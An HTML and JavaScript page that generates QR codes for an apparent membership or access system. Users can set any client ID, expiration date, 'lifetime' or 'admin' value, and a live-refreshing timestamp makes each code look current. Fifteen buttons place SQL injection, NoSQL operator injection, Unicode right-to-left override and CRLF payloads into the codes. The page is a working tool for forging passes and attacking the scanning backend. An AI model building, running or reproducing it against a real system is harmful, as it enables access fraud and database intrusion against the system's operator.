<!doctype html>
<html lang="en">
<head>
  <meta name="robots" content="noindex,nofollow">
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>QR generator</title>
  <style>
    /* Colour palette and shared properties copied from the portal */
    :root {
      --bg: #ffffff;
      --fg: #0f172a; /* slate-900 */
      --muted: #475569; /* slate-600 */
      --card: #f8fafc; /* slate-50 */
      --border: #e2e8f0; /* slate-200 */
      --brand: #2563eb; /* blue-600 */
      --brand-weak: #dbeafe; /* blue-100 */
      --radius: 18px;
      --shadow: 0 8px 30px rgba(2, 6, 23, 0.06);
      --qr-size: 366px;
      --qr-quiet-zone: 44px;
    }
    @media (prefers-color-scheme: dark) {
      :root {
        --bg: #0b1220;
        --fg: #e5e7eb;
        --muted: #9aa4b2;
        --card: #0f172a;
        --border: #1f2937;
        --brand: #60a5fa;
        --brand-weak: #1e293b;
        --shadow: 0 8px 30px rgba(0,0,0,0.35);
      }
    }

    html, body { height: 100%; }
    body {
      margin: 0;
      background: var(--bg);
      color: var(--fg);
      font: 16px/1.6 system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell,
            Noto Sans, "Helvetica Neue", Arial, "Apple Color Emoji", "Segoe UI Emoji";
    }
    .container {
      max-width: 1000px;
      margin: 0 auto;
      padding: 24px;
    }
    header {
      position: sticky;
      top: 0;
      backdrop-filter: saturate(140%) blur(6px);
      background: color-mix(in oklab, var(--bg) 85%, transparent);
      border-bottom: 1px solid var(--border);
      z-index: 10;
    }
    header .container {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .logo {
      display: grid;
      place-items: center;
      width: 40px;
      height: 40px;
      border-radius: 12px;
      background: var(--brand-weak);
      box-shadow: inset 0 0 0 1px var(--border);
      font-weight: 800;
      color: var(--brand);
    }
    h1 {
      font-size: clamp(24px, 4vw, 36px);
      line-height: 1.2;
      margin: 8px 0 0;
    }
    .lead {
      color: var(--muted);
      margin: 6px 0 0 0;
    }
    .hero {
      padding: 32px 0 12px;
    }
    /* Card reused from portal with subtle adjustments */
    .card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 20px;
      box-shadow: var(--shadow);
      transition: transform .14s ease, box-shadow .14s ease, border-color .14s ease;
    }
    .card:focus-visible {
      outline: 3px solid color-mix(in oklab, var(--brand) 60%, transparent);
      outline-offset: 2px;
    }
    /* Input group styling aligned with portal aesthetics */
    .input-group {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-top: 12px;
    }
    .input-group input {
      padding: 10px 12px;
      font-size: 15px;
      border: 1px solid var(--border);
      border-radius: calc(var(--radius) / 2);
      background: var(--card);
      color: var(--fg);
      box-sizing: border-box;
      outline: none;
    }
    .primary-btn {
      align-self: flex-start;
      padding: 10px 20px;
      font-size: 15px;
      font-weight: 600;
      color: var(--card);
      background: var(--brand);
      border: none;
      border-radius: calc(var(--radius) / 2);
      cursor: pointer;
      box-shadow: var(--shadow);
      transition: transform .14s ease, box-shadow .14s ease;
    }
    .primary-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 18px rgba(79, 70, 229, 0.3);
    }
    .primary-btn:active {
      transform: translateY(0);
      box-shadow: var(--shadow);
    }
    .primary-btn:focus-visible {
      outline: 3px solid color-mix(in oklab, var(--brand) 60%, transparent);
      outline-offset: 2px;
    }
    .field-row {
      display: flex;
      gap: 12px;
      align-items: center;
    }
    .field-row input {
      flex: 1;
    }
    .ghost-btn {
      padding: 10px 16px;
      font-size: 14px;
      font-weight: 500;
      border-radius: calc(var(--radius) / 2);
      border: 1px dashed var(--border);
      background: transparent;
      color: var(--muted);
      cursor: pointer;
      transition: border-color .14s ease, color .14s ease, background .14s ease;
    }
    .ghost-btn:hover,
    .ghost-btn:focus-visible {
      border-color: var(--brand);
      color: var(--brand);
      background: color-mix(in oklab, var(--brand-weak) 60%, transparent);
    }
    .ghost-btn.fallback-active {
      border-style: solid;
      border-color: var(--brand);
      color: var(--brand);
      background: color-mix(in oklab, var(--brand-weak) 80%, transparent);
    }
    /* QR display styling */
    #qr-container {
      margin-top: 20px;
      display: none;
      justify-content: center;
      align-items: center;
    }
    #qr-frame {
      padding: var(--qr-quiet-zone);
      background: #ffffff;
      border: 1px solid var(--border);
      border-radius: calc(var(--radius) / 2);
      box-shadow: var(--shadow);
      display: flex;
    }
    #qr-canvas {
      width: var(--qr-size);
      height: var(--qr-size);
      display: block;
    }
    footer {
      margin: 40px 0 20px;
      color: var(--muted);
      font-size: 13px;
      text-align: center;
    }
    .pill {
      display:inline-block;
      font-size:12px;
      padding:4px 8px;
      border-radius:999px;
      background: var(--brand-weak);
      color: var(--brand);
      border: 1px solid var(--border);
    }
    .payload-suite {
      margin-top: 24px;
      padding-top: 16px;
      border-top: 1px dashed var(--border);
    }
    .payload-title {
      margin: 0 0 12px;
      font-size: 13px;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      color: var(--muted);
    }
    .payload-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
    }
    .payload-btn {
      padding: 8px 14px;
      font-size: 13px;
      border-radius: calc(var(--radius) / 2);
      border: 1px solid var(--border);
      background: transparent;
      color: var(--muted);
      cursor: pointer;
      transition: border-color .14s ease, color .14s ease, background .14s ease;
    }
    .payload-btn.active,
    .payload-btn:hover,
    .payload-btn:focus-visible {
      border-color: var(--brand);
      color: var(--brand);
      background: color-mix(in oklab, var(--brand-weak) 70%, transparent);
    }
    .payload-message {
      font-size: 13px;
      color: var(--muted);
      margin: 0;
    }
  </style>
</head>
<body>
  <header>
    <div class="container">
      <div>
        <h1>QR generator</h1>
      </div>
    </div>
  </header>
  <main class="container">
    <section class="hero">
      <div class="card">
        <div class="input-group">
          <div class="field-row">
            <input type="text" id="number-input" placeholder="Enter client ID" aria-label="Enter client ID" inputmode="numeric" />
            <button type="button" id="admin-btn" class="ghost-btn">Admin mode</button>
          </div>
          <div class="field-row">
            <input type="date" id="date-input" aria-label="Enter membership expiration date" title="Enter membership expiration date" placeholder="Enter membership expiration date" />
            <button type="button" id="fallback-btn" class="ghost-btn" aria-pressed="false">Lifetime membership</button>
          </div>
          <button type="button" id="generate-btn" class="primary-btn">Generate</button>
        </div>
        <div id="qr-container">
          <div id="qr-frame">
            <canvas id="qr-canvas"></canvas>
          </div>
        </div>
        <section class="payload-suite" aria-label="Malicious payload tests">
          <h2 class="payload-title">Test payloads</h2>
          <div id="payload-buttons" class="payload-buttons">
            <button type="button" class="payload-btn" data-payload-template="client_id=%27%20OR%20%271%27%3D%271&center_id=1&time=1761180782877" aria-label="' OR '1'='1">1</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=%27%29%20OR%20%28%271%27%3D%271&center_id=1&time=1761180782877" aria-label="') OR ('1'='1">2</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=admin%27--&center_id=1&time=1761180782877" aria-label="admin'--">3</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=%27%20OR%201%3D1%20--%20&center_id=1&time=1761180782877" aria-label="' OR 1=1 --">4</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=%27%20UNION%20SELECT%20%271%27%20--%20&center_id=1&time=1761180782877" aria-label="' UNION SELECT '1' --">5</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=%27%20LIKE%20%27%%27%20--%20&center_id=1&time=1761180782877" aria-label="' LIKE '%%' --">6</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=%27%20OR%20%27a%27%3D%27a&center_id=1&time=1761180782877" aria-label="' OR 'a'='a">7</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=%27/*1*/%20OR%20/*x*/1%3D1--&center_id=1&time=1761180782877" aria-label="'/*test*/ OR /*x*/1=1--">8</button>
            <button type="button" class="payload-btn" data-payload-template="client_id[$ne]=null&center_id=1&time=1761180782877" aria-label="client_id[$ne]=null">9</button>
            <button type="button" class="payload-btn" data-payload-template="client_id[$regex]=.*&center_id=1&time=1761180782877" aria-label="client_id[$regex]=.*">10</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=%7B%22%24gt%22%3A%220%22%7D&center_id=1&time=1761180782877" aria-label='client_id={"$gt":"0"}'>11</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=1&center_id[$gt]=0&time=1761180782877" aria-label="center_id[$gt]=0">12</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=1&center_id=%7B%22%24ne%22%3Anull%7D&time=1761180782877" aria-label='center_id={"$ne":null}'>13</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=u%E2%80%AEser&center_id=1&time=1761180782877" aria-label="u&#8238;ser (RTL)">14</button>
            <button type="button" class="payload-btn" data-payload-template="client_id=%0d%0aFORGED&center_id=1&time=1761180782877" aria-label="CRLF forged">15</button>
          </div>
        </section>
      </div>
    </section>
  </main>
  <footer>
    <p>© <span id="year"></span> · <a href="/" style="color:inherit">simone</a></p>
  </footer>
  <!-- Include QRious library for QR generation -->
  <script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
  <script>
    (function(){
      // Initialize a reusable QRious instance
      let qr;
      const numberInput = document.getElementById('number-input');
      const dateInput = document.getElementById('date-input');
      const adminBtn = document.getElementById('admin-btn');
      const fallbackBtn = document.getElementById('fallback-btn');
      const generateBtn = document.getElementById('generate-btn');
      const qrContainer = document.getElementById('qr-container');
      const qrFrame = document.getElementById('qr-frame');
      const qrCanvas = document.getElementById('qr-canvas');
      const payloadButtonsContainer = document.getElementById('payload-buttons');
      const payloadNote = document.getElementById('payload-note');
      const payloadButtons = payloadButtonsContainer
        ? Array.from(payloadButtonsContainer.querySelectorAll('[data-payload-template]'))
        : [];
      let fallbackCenterId = null;
      let activeMode = 'standard';
      let activePayloadTemplate = null;
      let activePayloadButton = null;
      const DPR = window.devicePixelRatio || 1;
      const AUTO_REFRESH_INTERVAL = 2000;
      const QR_CODE_SIZE = 256 * DPR;
      const QUIET_ZONE_RATIO = 0.10;

      function applyQrSizing(size) {
        if (!qrFrame) {
          return;
        }
        const quietZone = Math.round(size * QUIET_ZONE_RATIO);
        qrFrame.style.setProperty('--qr-size', size + 'px');
        qrFrame.style.setProperty('--qr-quiet-zone', quietZone + 'px');
      }

      applyQrSizing(QR_CODE_SIZE);

      // Convert ISO date (YYYY-MM-DD) string to epoch milliseconds at Europe/Rome midnight
      function dateToRomeTimestamp(isoDate) {
        if (!isoDate) {
          return null;
        }
        const parts = isoDate.split('-');
        if (parts.length !== 3) {
          return null;
        }
        const year = Number(parts[0]);
        const month = Number(parts[1]);
        const day = Number(parts[2]);
        if (!Number.isInteger(year) || !Number.isInteger(month) || !Number.isInteger(day)) {
          return null;
        }
        const baseUtc = Date.UTC(year, month - 1, day);
        const probeDate = new Date(baseUtc);
        // ensure parsed date did not overflow (e.g. 2026-02-30)
        if (
          probeDate.getUTCFullYear() !== year ||
          probeDate.getUTCMonth() !== month - 1 ||
          probeDate.getUTCDate() !== day
        ) {
          return null;
        }
        const formatter = new Intl.DateTimeFormat('en-US', {
          timeZone: 'Europe/Rome',
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false,
          timeZoneName: 'shortOffset'
        });
        const partsWithOffset = formatter.formatToParts(probeDate);
        const offsetToken = partsWithOffset.find((p) => p.type === 'timeZoneName');
        if (!offsetToken) {
          return null;
        }
        const offsetMatch = offsetToken.value.match(/GMT([+-]\d{1,2})(?::?(\d{2}))?/);
        if (!offsetMatch) {
          return null;
        }
        const offsetSign = offsetMatch[1].startsWith('-') ? -1 : 1;
        const offsetHours = Math.abs(parseInt(offsetMatch[1], 10));
        const offsetMinutes = offsetMatch[2] ? parseInt(offsetMatch[2], 10) : 0;
        const totalOffsetMinutes = offsetSign * (offsetHours * 60 + offsetMinutes);
        return baseUtc - totalOffsetMinutes * 60_000;
      }

      function resetFallbackState() {
        if (fallbackCenterId !== null) {
          fallbackCenterId = null;
          fallbackBtn.classList.remove('fallback-active');
          fallbackBtn.textContent = 'Lifetime membership';
          fallbackBtn.setAttribute('aria-pressed', 'false');
        }
      }

      function clearActivePayloadButton() {
        if (activePayloadButton) {
          activePayloadButton.classList.remove('active');
          activePayloadButton.setAttribute('aria-pressed', 'false');
          activePayloadButton = null;
        }
      }

      function setActivePayloadButton(button) {
        if (activePayloadButton === button) {
          return;
        }
        clearActivePayloadButton();
        activePayloadButton = button;
        if (activePayloadButton) {
          activePayloadButton.classList.add('active');
          activePayloadButton.setAttribute('aria-pressed', 'true');
        }
      }

      function switchToStandardMode() {
        activeMode = 'standard';
        activePayloadTemplate = null;
        clearActivePayloadButton();
      }

      function switchToPayloadMode(template) {
        activeMode = 'payload';
        activePayloadTemplate = template;
      }

      function renderActivePayload() {
        if (!activePayloadTemplate) {
          return false;
        }
        const updatedPayload = activePayloadTemplate.replace(/time=\d+$/, 'time=' + Date.now().toString());
        renderQr(updatedPayload);
        return true;
      }

      function toggleFallback() {
        if (fallbackCenterId === 1) {
          resetFallbackState();
          switchToStandardMode();
          return;
        }
        fallbackCenterId = 1;
        fallbackBtn.classList.add('fallback-active');
        fallbackBtn.textContent = 'Lifetime membership active';
        fallbackBtn.setAttribute('aria-pressed', 'true');
        dateInput.value = '';
        switchToStandardMode();
      }

      function activateAdminMode() {
        numberInput.value = '0';
        numberInput.focus();
        switchToStandardMode();
      }

      function renderQr(value) {
        applyQrSizing(QR_CODE_SIZE);
        if (!qr) {
          qr = new QRious({ element: qrCanvas, size: QR_CODE_SIZE, level: 'Q', value: value });
        } else {
          qr.set({ size: QR_CODE_SIZE, level: 'Q', value: value });
        }
        qrContainer.style.display = 'flex';
      }

      function hasValidInputs() {
        if (!numberInput.value.trim()) {
          return false;
        }
        if (fallbackCenterId !== null) {
          return true;
        }
        const dateValue = dateInput.value;
        if (!dateValue) {
          return false;
        }
        return dateToRomeTimestamp(dateValue) !== null;
      }

      function generateQr(options = {}) {
        const { silent = false } = options;
        const numberValue = numberInput.value.trim();
        if (!numberValue) {
          if (!silent) {
            alert('Don\'t be a jerk');
          }
          return false;
        }

        let centerTimestamp = fallbackCenterId;
        if (centerTimestamp === null) {
          const dateValue = dateInput.value;
          if (!dateValue) {
            if (!silent) {
              alert('Select membership expiration date');
            }
            return false;
          }
          centerTimestamp = dateToRomeTimestamp(dateValue);
          if (centerTimestamp === null) {
            if (!silent) {
              alert('The selected date is not valid');
            }
            return false;
          }
        }

        const data =
          "client_id=" +
          encodeURIComponent(String(numberValue)) +
          "&center_id=" +
          encodeURIComponent(centerTimestamp.toString()) +
          "&time=" +
          Date.now().toString();
        renderQr(data);
        return true;
      }

      function extractClientLabelFromTemplate(template) {
        if (!template) {
          return 'Payload';
        }
        const match = template.match(/client_id=([^&]+)/);
        if (!match) {
          return 'Payload';
        }
        try {
          const decoded = decodeURIComponent(match[1])
            .replace(/[\r\n]+/g, ' ')
            .replace(/\s+/g, ' ')
            .trim();
          return decoded || 'Payload';
        } catch (error) {
          return match[1];
        }
      }

      fallbackBtn.addEventListener('click', toggleFallback);
      adminBtn.addEventListener('click', activateAdminMode);
      dateInput.addEventListener('input', () => {
        resetFallbackState();
        switchToStandardMode();
      });
      numberInput.addEventListener('input', () => {
        switchToStandardMode();
      });
      generateBtn.addEventListener('click', () => {
        switchToStandardMode();
        generateQr();
      });

      payloadButtons.forEach((button, index) => {
        const template = button.dataset.payloadTemplate || '';
        const label = extractClientLabelFromTemplate(template);
        if (!button.textContent.trim()) {
          button.textContent = (index + 1).toString() + '. ' + label;
        }
        button.title = label;
        button.setAttribute('aria-pressed', 'false');
        button.addEventListener('click', () => {
          resetFallbackState();
          setActivePayloadButton(button);
          dateInput.value = '';
          numberInput.value = label;
          switchToPayloadMode(template);
          const didRender = renderActivePayload();
          if (!didRender) {
            switchToStandardMode();
          }
        });
      });
      // set current year in the footer
      document.getElementById('year').textContent = new Date().getFullYear();
      window.setInterval(() => {
        if (document.hidden) {
          return;
        }
        if (activeMode === 'payload') {
          renderActivePayload();
          return;
        }
        if (!hasValidInputs()) {
          return;
        }
        generateQr({ silent: true });
      }, AUTO_REFRESH_INTERVAL);
    })();
  </script>
</body>
</html>
